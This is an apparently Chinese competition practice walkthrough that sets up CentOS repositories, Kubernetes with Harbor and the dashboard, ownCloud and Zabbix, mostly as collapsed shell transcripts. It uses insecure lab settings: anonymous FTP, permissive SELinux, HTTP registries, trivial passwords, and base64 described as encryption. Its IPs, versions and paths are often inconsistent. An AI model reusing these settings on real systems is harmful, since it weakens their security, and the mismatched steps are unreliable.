enforcing.#     disabled - No SELinux policy is loaded.SELINUX=permissive# SELINUXTYPE= can take one of three two values:#     targeted - Targeted processes are protected,#     minimum - Modification of targeted policy. Only selected processes are protected.#     mls - Multi Level Security protection.SELINUXTYPE=targeted



②将提供的 CentOS-7-x86_64-DVD-1804.iso 和 qdkills_cloud_paas.iso 光盘镜像文件移动到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 paas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 永久挂载到 centos 目录下，将镜像文件qdskills_cloud_paas.iso 永久挂载到 &#x2F;opt&#x2F;paas 目录下。
[root@localhost ~]# mkdir /opt/centos[root@localhost ~]# mkdir /opt/paas[root@localhost ~]# vi + /etc/fstab## /etc/fstab# Created by anaconda on Mon Apr 17 08:27:55 2023## Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info#/dev/mapper/centos-root /                       xfs     defaults        0 0UUID=e1892f7d-c16f-47b3-888b-77d0af3521f6 /boot                   xfs     defaults        0 0#/dev/mapper/centos-swap swap                    swap    defaults        0 0/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0[root@localhost ~]# mount -amount: /dev/loop0 is write-protected, mounting read-onlymount: /dev/loop1 is write-protected, mounting read-only

③在 master 节点首先将系统自带的 yum 源移动到&#x2F;home 目录，然后为 master 节点配置本地 yum 源，yum 源文件名为 local.repo。
[root@master ~]# mv /etc/yum.repos.d/CentOS-* /home/[root@master ~]# vi /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[paas]name=centosbaseurl=file:///opt/paas/kubernetes-repogpgcheck=0enabled=1[root@master ~]# yum repolist



④在 master 节点安装 ftp 服务，将 ftp 共享目录设置为 &#x2F;opt&#x2F;。
[root@master ~]# yum install -y vsftpd[root@master ~]# echo &quot;anon_root=/opt&quot; &gt;&gt; /etc/vsftpd/vsftpd.conf[root@master ~]# systemctl enable --now vsftpdCreated symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.

⑤为 node1 节点和 node2 节点分别配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务器地址为 master 节点,配置 ftp 源时不要写 IP 地址，配置之后，两台机器都安装 kubectl 包作为安装测试。
[root@master ~]# mv /etc/yum.repos.d/CentOS-* /home/[root@localhost ~]# cat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://master/centosgpgcheck=0enabled=1[paas]name=paasbaseurl=ftp://master/paas/kubernetes-repogpgcheck=0enabled=1[root@localhost ~]# yum install -y kubectl



⑥在 master 节点上部署 chrony 服务器，允许其它节点同步时间，启动服务并设置为开机自启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机自启动。
master节点
[root@master ~]# vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16allow 192.168.157.0/24# Serve time even if not synchronized to a time source.#local stratum 10local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking##重启服务[root@localhost ~]# systemctl restart chronyd[root@localhost ~]# systemctl enable chronyd[root@localhost ~]# chronyc sources

node节点
[root@localhost ~]# cat /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking##重启服务[root@localhost ~]# systemctl restart chronyd[root@localhost ~]# systemctl enable chronyd[root@localhost ~]# chronyc sources



⑦为四台服务器设置免密登录，保证服务器之间能够互相免密登录。
[root@localhost ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Created directory &#x27;/root/.ssh&#x27;.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:qveHAExYRiPQVv5rlsI3owC/pO72K9ZK+pOJFPnPfFQ root@node1The key&#x27;s randomart image is:+---[RSA 2048]----+|.o.=*            ||  ++..           || ..o.            || o  o.   E       ||. o  .. S        || + o  .=         ||.o=o* @. .       ||+*++ @.+. .      ||B=*++.....       |+----[SHA256]-----+[root@master ~]# ssh-copy-id root@node1/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@node1&#x27;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &#x27;root@node1&#x27;&quot;and check to make sure that only the key(s) you wanted were added.[root@master ~]# ssh-copy-id root@node2/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@node2&#x27;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &#x27;root@node2&#x27;&quot;and check to make sure that only the key(s) you wanted were added.[root@master ~]# ssh-copy-id root@harbor/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@harbor&#x27;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &#x27;root@harbor&#x27;&quot;and check to make sure that only the key(s) you wanted were added.



任务2  k8s 搭建任务①在所有节点上安装dokcer-ce,并设置为开机自启动。
##所有节点[root@master ~]# yum install -y docker docker-ce[root@master ~]# systemctl enable --now docker



②所有节点配置阿里云镜像加速地址(https://7hw6x2is.mirror.aliyuncs.com)并把启动引擎设置为systemd，配置成功后加载配置文件并重启docker服务。
[root@master ~]# cat /etc/docker/daemon.json&#123;  &quot;insecure-registries&quot;: [&quot;192.168.157.53&quot;],  &quot;registry-mirrors&quot;: [&quot;https://7hw6x2is.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;[root@master ~]# systemctl restart docker



③在master节点&#x2F;opt&#x2F;images目录下使用tar归档文件载入镜像。
[root@master ~]# for i in $(ls /opt/paas/images | grep tar) ; do docker load -i /opt/paas/images/$i ;done



④在master节点使用 &#x2F;opt&#x2F;docker-compose&#x2F;v2.10.2-docker-compose-linux-x86_64文件安装docker-compose。安装完成后执行docker-compose version命令。
[root@localhost opt]# cp -p /opt/paas/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose



⑤在master节点解压&#x2F;opt&#x2F;harbor&#x2F; harbor-offline-installer-v2.5.3.tgz离线安装包，然后安装harbor仓库，并修改相应的yml文件，使各节点默认docker仓库为harbor仓库地址。
[root@localhost opt]# tar -zxvf harbor-offline-installer-v2.1.0.tgzharbor/harbor.v2.1.0.tar.gzharbor/prepareharbor/LICENSEharbor/install.shharbor/common.shharbor/harbor.yml.tmpl[root@localhost opt]# cd harbor[root@localhost harbor]# lscommon.sh  harbor.v2.1.0.tar.gz  harbor.yml.tmpl  install.sh  LICENSE  prepare[root@localhost harbor]# mv harbor.yml.tmpl harbor.yml[root@localhost harbor]# vi harbor.yml[root@harbor harbor]# cat harbor.yml# Configuration file of Harbor# The IP address or hostname to access admin UI and registry service.# DO NOT use localhost or 127.0.0.1, because Harbor needs to be accessed by external clients.hostname: 192.168.157.50   ##修改IP地址# http related confighttp:  # port for http, default is 80. If https enabled, this port will redirect to https port  port: 80  ###在此处注释掉https# https related config#https:  # https port for harbor, default is 443 # port: 443  # The path of cert and key files for nginx  #certificate: /your/certificate/path  #private_key: /your/private/key/path........[root@localhost harbor]# ./prepare[root@harbor harbor]# ./install.sh



⑥在master节点执行&#x2F;opt&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库。
[root@master paas]# ./k8s_image_push.sh输入镜像仓库地址(不加http/https): 192.168.157.53输入镜像仓库用户名: admin输入镜像仓库用户密码: Harbor12345您设置的仓库地址为: 192.168.157.53,用户名: admin,密码: xxx是否确认(Y/N): yWARNING! Using --password via the CLI is insecure. Use --password-stdin.WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-store镜像仓库 Login Succeeded



⑦执行&#x2F;opt&#x2F;k8s_con_ner_bui_install.sh部署Kubeadm、containerd、nerdctl和buildkit。
##此处只安装kubectl kubeadm kubelet即可
[root@master ~]# yum install -y kubelet kubeadm kubectl##开机自启[root@localhost ~]# systemctl enable --now kubeletCreated symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /usr/lib/systemd/system/kubelet.service.



⑧在master节点kubeadm命令初始化集群，使用本地Harbor仓库。
[root@master ~]# kubeadm init --apiserver-advertise-address 192.168.157.50 --pod-network-cidr 10.244.0.0/16 --kubernetes-version 1.18.1 --image-repository 192.168.157.50/library/[root@localhost ~]# mkdir -p $HOME/.kube[root@localhost ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config[root@localhost ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config



⑨修改提供的&#x2F;opt&#x2F;yaml&#x2F;flannel&#x2F;kube-flannel.yaml,使其镜像来源为本地Harbor仓库，然后安装kubernetes网络插件，安装完成后使用命令查看节点状态。
# eval sed -i &#x27;s@docker.io/flannel@192.168.157.50/library@g&#x27; /opt/paas/yaml/flannel/kube-flannel.yaml[root@master ~]# kubectl apply -f /opt/paas/yaml/flannel/kube-flannel.yaml[root@master ~]# kubectl get nodesNAME     STATUS     ROLES           AGE     VERSIONmaster   Ready   control-plane   9m42s   v1.18.1



⑩给kubernetes创建证书,命名空间为kubernetes-dashboard,涉及到的所有文件命名为dashboard例如dashboard.crt。
[root@master ~]# mkdir dashboard-certs[root@master ~]# cd dashboard-certs/[root@master ~]# kubectl create namespace kubernetes-dashboard[root@master ~]# openssl genrsa -out dashboard.key 2048[root@master ~]# openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;[root@master ~]# openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crt[root@master ~]# kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard[root@master ~]# sed -i &quot;s/kubernetesui/$IP\/library/g&quot; /opt/yaml/dashboard/recommended.yaml[root@master ~]# kubectl apply -f /opt/paas/yaml/dashboard/recommended.yaml[root@master ~]# kubectl apply -f /opt/paas/yaml/dashboard/dashboard-adminuser.yaml



11修改&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml的镜像来源为本地Harbor仓库，然后使用&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml和&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;dashboard-adminuser.yaml安装kubernetes dashboard界面，完成后查看首页。
[root@master ~]# eval sed -i &quot;s/kubernetesui/192.168.157.50\/library/g&quot; /opt/yaml/dashboard/recommended.yaml[root@master ~]# kubectl apply -f /opt/yaml/dashboard/recommended.yaml[root@master ~]# kubectl apply -f /opt/yaml/dashboard/dashadmin-user.yaml[root@master ~]# kubectl get svc -n kubernetes-dashboardNAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGEdashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP        23mkubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP   23m



12为了能使pod调度到master节点,用命令删除污点。在浏览器访问dashboard（https://IP:30001）
# kubectl describe nodes master | grep Taintskubectl taint nodes master node-role.kubernetes.io/control-plane-# kubectl describe nodes master | grep TaintsTaints:             &lt;none&gt;



13在node节点执行k8s_node_install.sh，将该节点加入kubernetes集群。完成后在master节点上查看所有节点状态。
##此处在kubeadm init 最后一条kubeadm join 192.168.157.51:6443 --token s6fq1p.kmluoke4b9qp7hdi \    --discovery-token-ca-cert-hash sha256:1d2867c654a33891b6077357bfb6d1e4babfb2e04f834944fcbad83f05d1bdc3



任务3部署Owncloud网盘服务①编写yaml文件(文件名自定义)创建PV和PVC来提供持久化存储，以便保存 ownCloud 服务中的文件和数据。要求：PV（访问模式为读写，只能被单个节点挂载;存储为5Gi;存储类型为hostPath,存储路径自定义）PVC（访问模式为读写，只能被单个节点挂载;申请存储空间大小为5Gi）。
# cat owncloud-pvc.yamlapiVersion: v1kind: PersistentVolumemetadata:  name: owncloud-pvspec:  accessModes:    - ReadWriteOnce  capacity:    storage: 5Gi  hostPath:    path: /data/owncloud---apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: owncloud-pvcspec:  accessModes:    - ReadWriteOnce  resources:    requests:      storage: 5Gi# kubectl apply -f /opt/owncloud-pvc.yaml# kubectl get pv,pvcNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGEpersistentvolume/owncloud-pv   5Gi        RWO            Retain           Bound    default/owncloud-pvc                           2m41sNAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGEpersistentvolumeclaim/owncloud-pvc   Bound    owncloud-pv   5Gi        RWO                           2m41s



②编写yaml文件(文件名自定义)创建一个configMap对象，指定OwnCloud的环境变量。登录账号对应的环境变量为OWNCLOUD_ADMIN_USERNAME,密码对应的环境变量为OWNCLOUD_ADMIN_PASSWORD。（变量值自定义）。
# cat owncloud-configmap.yamlapiVersion: v1kind: ConfigMapmetadata:  name: owncloud-configdata:  OWNCLOUD_ADMIN_USERNAME: “admin”  OWNCLOUD_ADMIN_PASSWORD: “123456”# kubectl apply -f  owncloud-configmap.yaml# kubectl get ConfigMapNAME               DATA   AGEkube-root-ca.crt   1      20howncloud-config    2      2m11s



③编写yaml文件(文件名自定义)创建一个Secret对象，以保存OwnCloud数据库的密码。对原始密码采用base64编码格式进行加密。
# echo 123456 | base64MTIzNDU2Cg==# cat owncloud-secret.yamlapiVersion: v1kind: Secretmetadata:  name: owncloud-db-passwordtype: Opaquedata:  password: MTIzNDU2Cg==# kubectl apply -f /opt/owncloud-secret.yaml#kubectl get SecretNAME                   TYPE     DATA   AGEowncloud-db-password   Opaque   1      46s



④编写yaml文件(文件名自定义) 创建Deployment对象, 指定OwnCloud的容器和相关的环境变量。(Deployment资源命名为owncloud-deployment,镜像为Harbor仓库中的owncloud:latest，存储的挂载路径为&#x2F;var&#x2F;www&#x2F;html,其它根据具体情况进行配置)。
# cat owncloud-deploy.yamlapiVersion: apps/v1kind: Deploymentmetadata:  name: owncloud-deploymentspec:  replicas: 1  selector:    matchLabels:      app: owncloud  template:    metadata:      labels:        app: owncloud    spec:      containers:      - name: owncloud        image: 192.168.100.91/library/owncloud:latest        imagePullPolicy: IfNotPresent        envFrom:        - configMapRef:            name: owncloud-config        env:        - name: OWNCLOUD_DB_PASSWORD          valueFrom:            secretKeyRef:              name: owncloud-db-password              key: password        ports:        - containerPort: 80        volumeMounts:        - name: owncloud-pv          mountPath: /var/www/html      volumes:      - name: owncloud-pv        persistentVolumeClaim:          claimName: owncloud-pvc# kubectl apply -f /opt/owncloud-deploy.yaml# kubectl describe podName:             owncloud-deployment-845c85cfcb-6ptqrNamespace:        defaultPriority:         0Service Account:  defaultNode:             node/192.168.100.23Start Time:       Fri, 17 Mar 2023 02:56:31 +0000Labels:           app=owncloud                  pod-template-hash=845c85cfcbAnnotations:      &lt;none&gt;Status:           RunningIP:               10.244.1.3IPs:  IP:           10.244.1.3Controlled By:  ReplicaSet/owncloud-deployment-845c85cfcbContainers:  owncloud:    Container ID:   containerd://d60dc4426c06cef6525e4e37f0ee37dcef762c2806c19efcd666f951d66a5c84    Image:          192.168.100.91/library/owncloud:latest    Image ID:       192.168.100.91/library/owncloud@sha256:5c77bfdf8cfaf99ec94309be2687032629f4f985d6bd388354dfd85475aa5f21    Port:           80/TCP    Host Port:      0/TCP    State:          Running      Started:      Fri, 17 Mar 2023 02:56:39 +0000    Ready:          True    Restart Count:  0    Environment Variables from:      owncloud-config  ConfigMap  Optional: false    Environment:      OWNCLOUD_DB_PASSWORD:  &lt;set to the key &#x27;password&#x27; in secret &#x27;owncloud-db-password&#x27;&gt;  Optional: false    Mounts:      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-vtpd9 (ro)      /var/www/html from owncloud-pv (rw)Conditions:  Type              Status  Initialized       True  Ready             True  ContainersReady   True  PodScheduled      TrueVolumes:  owncloud-pv:    Type:       PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace)    ClaimName:  owncloud-pvc    ReadOnly:   false  kube-api-access-vtpd9:    Type:                    Projected (a volume that contains injected data from multiple sources)    TokenExpirationSeconds:  3607    ConfigMapName:           kube-root-ca.crt    ConfigMapOptional:       &lt;nil&gt;    DownwardAPI:             trueQoS Class:                   BestEffortNode-Selectors:              &lt;none&gt;Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300sEvents:  Type    Reason     Age   From               Message  ----    ------     ----  ----               -------  Normal  Scheduled  14m   default-scheduler  Successfully assigned default/owncloud-deployment-845c85cfcb-6ptqr to node  Normal  Pulling    14m   kubelet            Pulling image &quot;192.168.100.91/library/owncloud:latest&quot;  Normal  Pulled     14m   kubelet            Successfully pulled image &quot;192.168.100.91/library/owncloud:latest&quot; in 7.266482912s  Normal  Created    14m   kubelet            Created container owncloud  Normal  Started    14m   kubelet            Started container owncloud



⑤编写yaml文件(文件名自定义)创建一个Service对象将OwnCloud公开到集群外部。通过http://IP:端口号可查看owncloud.
# cat owncloud-svc.yamlapiVersion: v1kind: Servicemetadata:  name: owncloud-servicespec:  selector:    app: owncloud  ports:    - name: http      port: 80  type: NodePort# kubectl apply -f /opt/owncloud-svc.yaml#kubectl get svc -ANAMESPACE              NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGEdefault                kubernetes                  ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  24hdefault                owncloud-service            NodePort    10.98.228.242    &lt;none&gt;        80:31024/TCP             17mkube-system            kube-dns                    ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   24hkubernetes-dashboard   dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP                 22hkubernetes-dashboard   kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP            22h

C模块：企业级应用的自动化部署和运维（样题）zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位&#x2F;解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。



IP
主机名
节点



192.168.157.40
zabbix-server
Server节点


192.168.157.41
zabbix-agent
Agent节点


部署方式：监控主机zabbix_server节点采用手动部署，被监控主机zabbix_agent采用Playbook部署。
注意 压缩包需要解压后配置为yum仓库可以使用
①修改主机名zabbix_server节点主机名为zabbix_server,zabbix_agent节点主机名为Zabbix_agent,使用提供的软件包&#x2F;root&#x2F;autoDeployment.tar在zabbix_server节点安装ansible.
[root@localhost ~]# hostnamectl set-hostname zabbix-server  [root@localhost ~]# hostnamectl set-hostname zabbix-agent

②在zabbix_server节点配置hosts文件，并将该文件远程发送给zabbix_agent节点，并配置免密登录。
[root@localhost ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:r7ZDne6h3xaK6zVevWSj77paApHMV6RAXHzH2s78cMc root@zabbix-agentThe key&#x27;s randomart image is:+---[RSA 2048]----+|       ooo..o.   ||       o.o.o. o  ||        = o. +   ||         o  . .  ||        S. . + . ||        .oo ..= E||       . o*.o.=+.||        +=oB.+ o.||       o**=o==+  |+----[SHA256]-----+[root@localhost ~]# ssh-copy-id root@zabbix-agent/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;The authenticity of host &#x27;192.168.157.40 (192.168.157.40)&#x27; can&#x27;t be established.ECDSA key fingerprint is SHA256:EWGohbn7cIhP7AAYHbnuMx/IoLAEybzPJENWQazAFG4.ECDSA key fingerprint is MD5:81:d6:a5:02:87:4b:13:1b:eb:69:76:1c:5c:aa:80:bf.Are you sure you want to continue connecting (yes/no)? yes/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@192.168.157.40&#x27;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &#x27;root@192.168.157.40&#x27;&quot;and check to make sure that only the key(s) you wanted were added.

③在Zabbix_server节点配置ansible主机清单，在清单中创建agent主机组。
[root@zabbix-server ~]# cat /etc/ansible/hosts[agent]zabbix-agent



④配置基础环境，安装nginx和php74（根据实际需要安装相关php74扩展包），并开启相关服务。
[root@zabbix_server opt]# yum -y install nginx[root@zabbix_server ~]# systemctl start nginx[root@zabbix_server ~]# yum -y install php74-php-fpm php74-php-common php74-php-cli php74-php-gd php74-php-ldap php74-php-mbstring php74-php-mysqlnd php74-php-xml php74-php-bcmath php74-php[root@zabbix_server ~]#systemctl start php74-php-fpm[root@zabbix_server ~]#  nginx -v &amp;&amp; php74 -vnginx version: nginx/1.22.1PHP 7.4.33 (cli) (built: Feb 14 2023 08:49:52) ( NTS )Copyright (c) The PHP GroupZend Engine v3.4.0, Copyright (c) Zend Technologies



⑤在zabbix_server节点安装zabbix服务器、代理和web前端，安装前注意查看rpm包的名字,并分别启动zabbix-server和zabbix-agent。
# yum -y install zabbix-server  zabbix-web-mysql zabbix-agent# systemctl start zabbix-server&amp;&amp; systemctl start zabbix-agent# systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent● zabbix-server-mysql.service - Zabbix Server with MySQL DB   Loaded: loaded (/usr/lib/systemd/system/zabbix-server-mysql.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:36:50 UTC; 4min 5s ago Main PID: 20737 (zabbix_server)   CGroup: /system.slice/zabbix-server-mysql.service           └─20737 /usr/sbin/zabbix_server -fMar 18 04:36:50 zabbix_server systemd[1]: Started Zabbix Serve...Hint: Some lines were ellipsized, use -l to show in full.● zabbix-agent.service - Zabbix Agent   Loaded: loaded (/usr/lib/systemd/system/zabbix-agent.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:37:47 UTC; 3min 8s ago  Process: 20752 ExecStart=/usr/sbin/zabbix_agentd -c $CONFFILE (code=exited, status=0/SUCCESS)  Main PID: 20754 (zabbix_agentd)   CGroup: /system.slice/zabbix-agent.service           ├─20754 /usr/sbin/zabbix_agentd -c /etc/zabbix/zabb...           ├─20755 /usr/sbin/zabbix_agentd: collector [idle 1 ...           ├─20756 /usr/sbin/zabbix_agentd: listener #1 [waiti...           ├─20757 /usr/sbin/zabbix_agentd: listener #2 [waiti...           ├─20758 /usr/sbin/zabbix_agentd: listener #3 [waiti...           └─20759 /usr/sbin/zabbix_agentd: active checks #1 [...Mar 18 04:37:47 zabbix_server systemd[1]: Starting Zabbix Agen...Mar 18 04:37:47 zabbix_server systemd[1]: Started Zabbix Agent.Hint: Some lines were ellipsized, use -l to show in full.



⑥安装数据库MariaDB，启动数据库并设置为开机自启动。
# yum -y install mariadb-server# systemctl enable --now mariadb# systemctl status mariadb● mariadb.service - MariaDB database server   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:52:20 UTC; 1min 2s ago  Process: 20907 ExecStartPost=/usr/libexec/mariadb-wait-ready $MAINPID (code=exited, status=0/SUCCESS)  Process: 20822 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS) Main PID: 20905 (mysqld_safe)   CGroup: /system.slice/mariadb.service           ├─20905 /bin/sh /usr/bin/mysqld_safe --basedir=/usr...           └─21071 /usr/libexec/mysqld --basedir=/usr --datadi...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: M...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: P...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: T...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: Y...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: C...Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...Mar 18 04:52:20 zabbix_server systemd[1]: Started MariaDB data...Hint: Some lines were ellipsized, use -l to show in full.



⑦登录mysql,创建数据库zabbix和用户zabbix密码自定义，并授权zabbix用户拥有zabbix数据库的所有权限。
# mysql -uroot -pMariaDB [(none)]&gt; create database zabbix charset utf8 collate utf8_bin;;MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &#x27;password&#x27;;MariaDB [zabbix]&gt; show grants for &#x27;zabbix&#x27;@&#x27;localhost&#x27;;+---------------------------------------------------------------------------------------------------------------+| Grants for zabbix@localhost                                                                                   |+---------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27; IDENTIFIED BY PASSWORD &#x27;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&#x27; || GRANT ALL PRIVILEGES ON `zabbix`.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27;



⑧分别导入数据库架构及数据，对应的文件分别为schema.sql、images.sql和data.sql（文件顺便不能乱）。
#导入zabbix SQL[root@zabbix-server ~]# zcat /usr/share/doc/zabbix-server-mysql-4.0.24/create.sql.gz | mysql -uroot -p123456 zabbix



⑨配置default.conf。
vim /etc/nginx/conf.d/default.conf修改内容如下root /usr/share/zabbix/;index index.php index.html index.htm;#cat /etc/nginx/conf.d/default.confserver &#123;listen 80;server_name localhost;#access_log /var/log/nginx/host.access.log main;location / &#123;root /usr/share/zabbix/;index index.php index.html index.htm;&#125;#error_page 404 /404.html;# redirect server error pages to the static page /50x.html#error_page 500 502 503 504 /50x.html;location = /50x.html &#123;root /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;# proxy_pass http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ &#123;	root /usr/share/zabbix;	fastcgi_pass 127.0.0.1:9000;	fastcgi_index index.php;	fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;	include fastcgi_params;&#125;# deny access to .htaccess files, if Apache&#x27;s document root# concurs with nginx&#x27;s one##location ~ /\.ht &#123;# deny all;#&#125;&#125;



⑩分别修改配置文件zabbix_server.conf(修改数据库密码)和zabbix_agentd.conf（修改服务器IP，活动服务器IP和主机名），并重启对应服务使配置生效。
[root@zabbix_server ~]# vim /etc/zabbix_server.confDBName=zabbixDBUser=zabbixDBPassword=password[root@zabbix_server ~]# vim /etc/zabbix_agentd.confServer=192.168.157.40ServerActive=192.168.157.40Hostname=zabbix_server[root@zabbix_server ~]# cat /etc/zabbix_agentd.conf | grep -v &#x27;^#\|^$&#x27;PidFile=/run/zabbix/zabbix_agentd.pidLogFile=/var/log/zabbix/zabbix_agentd.logLogFileSize=0Server=192.168.100.91ServerActive=192.168.100.91Hostname=zabbix_server[root@master ~]# systemctl restart zabbix-server[root@master ~]# systemctl restart zabbix-agent



